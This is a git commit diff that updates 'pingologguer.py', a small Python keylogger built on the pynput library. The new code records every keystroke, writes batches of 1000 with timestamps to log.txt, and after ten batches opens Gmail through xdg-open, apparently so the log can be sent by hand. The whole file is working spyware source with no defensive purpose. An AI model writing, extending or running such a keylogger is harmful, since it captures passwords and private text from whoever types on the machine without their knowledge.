5bfae7cc44357d2fe28d7b84781672a1b25cecba
d4kox <101132138+d4kox@users.noreply.github.com>
2022-05-01 11:17:04 -0300

    Update pingologguer.py

--- pingologguer.py
+++ pingologguer.py
@@ -1,7 +1,31 @@
-from pynput.keyboard import Listener
+from pynput import keyboard as kb
+import time, os
+# Variables
+recoleccion = []
+global registros
+registros = 0
 
-def key_recorder(key):
-    print(key)
 
-with Listener(on_press=key_recorder) as l:
-    l.join()
+def charge_log(log,logs):
+	date_log = str(time.strftime("%d/%m/%y"))+" - "+str(time.strftime("%H:%M:%S"))
+	nombre_archivo = "log.txt"
+	with open(nombre_archivo, "a") as archivo:
+		archivo.write(date_log+"\n")
+		archivo.write(str(log)+"\n\n")
+	archivo.close()
+	global registros
+	registros = logs+1
+	if registros >= 10:
+		os.system('xdg-open "https://mail.google.com/"')
+		registros = 0
+
+def pulsa(tecla):
+	if len(recoleccion) >= 1000:
+		charge_log(recoleccion,registros)
+		recoleccion.clear()
+	else:
+		recoleccion.append(tecla)
+		print(recoleccion)
+			
+with kb.Listener(pulsa) as escuchador:
+	escuchador.join()
